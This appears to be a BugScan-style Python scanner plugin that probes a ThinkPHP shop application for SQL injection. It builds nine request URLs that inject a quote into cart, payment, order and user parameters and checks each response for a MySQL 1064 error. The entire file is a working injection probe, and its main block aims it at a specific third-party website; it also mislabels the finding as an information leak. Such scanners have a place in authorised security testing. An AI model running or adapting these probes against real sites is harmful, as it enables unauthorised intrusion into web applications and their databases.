#!/usr/bin/env python
#-*- coding:utf-8 -*-

def assign(service, arg):
    if service == "thinkphp":
        return True, arg

def audit(arg):
    poc1 = arg + 'index.php?s=/home/shopcart/getPricetotal/tag/1%27'
    poc2 = arg + 'index.php?s=/home/shopcart/getpriceNum/id/1%27'
    poc3 = arg + 'index.php?s=/home/user/cut/id/1%27'
    poc4 = arg + 'index.php?s=/home/service/index/id/1%27'
    poc5 = arg + 'index.php?s=/home/pay/chongzhi/orderid/1%27'
    poc6 = arg + 'index.php?s=/home/pay/index/orderid/1%27'
    poc7 = arg + 'index.php?s=/home/order/complete/id/1%27'
    poc8 = arg + 'index.php?s=/home/order/detail/id/1%27'
    poc9 = arg + 'index.php?s=/home/order/cancel/id/1%27'
    for poc in (poc1,poc2,poc3,poc4,poc5,poc6,poc7,poc8,poc9):
        code, head, res, errcode, _ = curl.curl2(poc)
        if '1064 You have' in res:
            security_hole("infomation leak:"+poc)

if __name__ == '__main__':
    from dummy import *
    audit(assign('thinkphp', 'http://www.binkanter.com/')[1])